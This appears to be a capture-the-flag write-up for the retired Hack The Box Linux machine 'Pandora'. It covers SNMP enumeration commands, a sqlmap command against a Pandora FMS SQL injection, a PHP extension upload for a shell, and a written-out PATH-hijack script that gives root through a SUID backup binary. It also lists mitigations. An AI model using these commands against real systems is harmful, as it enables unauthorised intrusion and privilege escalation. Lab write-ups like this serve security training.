---
machine: Pandora
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, snmp, pandora-fms, sqli, suid, path-hijack]
---

# Pandora — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

SNMP with community `public` leaks database credentials. Pandora FMS is vulnerable to SQLi, allowing panel access and extension upload; a SUID binary (`pandora_backup`) runs `tar` without an absolute path, enabling a PATH hijack to root.

## Enumeration

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -sU -p161 --script snmp-brute,snmp-info <IP>
snmpwalk -v2c -c public <IP>
```

SNMP returns processes and MySQL/Pandora credentials. Add `pandora.htb` to hosts and review port 80.

## Initial access

Pandora FMS 7.0NG is vulnerable to SQLi in the admin panel. Use `sqlmap` or a manual payload to extract users and hashes. Valid credentials grant panel access.

```bash
sqlmap -u 'http://pandora.htb/pandora_console/index.php?...' --batch --dbs
```

## Lateral movement

The panel allows uploading extensions or scripts. Upload a PHP extension that runs commands and get a shell as `www-data`/`pandora`.

## Privilege escalation

```bash
find / -perm -4000 -type f 2>/dev/null
```

`/usr/bin/pandora_backup` is SUID and calls `tar` without an absolute path. Create a malicious `tar` in a controlled directory and prepend it to PATH:

```bash
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/tar
chmod +x /tmp/tar
PATH=/tmp:$PATH /usr/bin/pandora_backup
```

The resulting shell is root.

## Evidence

- `snmpwalk` with redacted credentials.
- SQLi query and redacted dump.
- Uploaded extension and shell.
- `pandora_backup` SUID and PATH hijack.

## Lessons learned

- SNMP with the default community exposes processes and secrets.
- Old Pandora FMS needs SQLi and extension-upload review.
- SUID binaries invoking commands without absolute paths are direct escalation.
- The service PATH matters.

## Mitigation and detection

- Disable SNMP or use v3 with ACLs.
- Update Pandora FMS and parameterise queries.
- Restrict extension uploads.
- Use absolute paths in privileged scripts.

## References

- <https://www.hackthebox.com/machines/pandora>
- <https://pandorafms.com/>
- <https://gtfobins.github.io/gtfobins/tar/>
